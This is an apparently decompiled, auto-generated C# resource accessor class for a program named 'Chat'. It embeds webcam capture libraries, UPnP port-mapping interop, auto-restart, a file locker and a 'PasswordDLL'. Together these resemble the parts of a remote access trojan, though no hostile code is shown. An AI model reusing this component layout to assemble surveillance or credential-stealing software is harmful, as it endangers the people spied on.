namespace Chat.My.Resources
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.CodeDom.Compiler;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Globalization;
    using System.Resources;
    using System.Runtime.CompilerServices;

    [HideModuleName, DebuggerNonUserCode, CompilerGenerated, GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0"), StandardModule]
    internal sealed class Resources
    {
        private static CultureInfo resourceCulture;
        private static System.Resources.ResourceManager resourceMan;

        internal static byte[] AForge_Video
        {
            get
            {
                return (byte[]) RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("AForge_Video", resourceCulture));
            }
        }

        internal static byte[] AForge_Video_DirectShow
        {
            get
            {
                return (byte[]) RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("AForge_Video_DirectShow", resourceCulture));
            }
        }

        internal static byte[] Autorestart
        {
            get
            {
                return (byte[]) RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("Autorestart", resourceCulture));
            }
        }

        [EditorBrowsable(EditorBrowsableState.Advanced)]
        internal static CultureInfo Culture
        {
            get
            {
                return resourceCulture;
            }
            set
            {
                resourceCulture = value;
            }
        }

        internal static byte[] DetectDesktop
        {
            get
            {
                return (byte[]) RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("DetectDesktop", resourceCulture));
            }
        }

        internal static byte[] Filelocker
        {
            get
            {
                return (byte[]) RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("Filelocker", resourceCulture));
            }
        }

        internal static byte[] Interop_NATUPNPLib
        {
            get
            {
                return (byte[]) RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("Interop_NATUPNPLib", resourceCulture));
            }
        }

        internal static byte[] PasswordDLL
        {
            get
            {
                return (byte[]) RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("PasswordDLL", resourceCulture));
            }
        }

        [EditorBrowsable(EditorBrowsableState.Advanced)]
        internal static System.Resources.ResourceManager ResourceManager
        {
            get
            {
                if (object.ReferenceEquals(resourceMan, null))
                {
                    System.Resources.ResourceManager manager2 = new System.Resources.ResourceManager("Chat.Resources", typeof(Chat.My.Resources.Resources).Assembly);
                    resourceMan = manager2;
                }
                return resourceMan;
            }
        }
    }
}

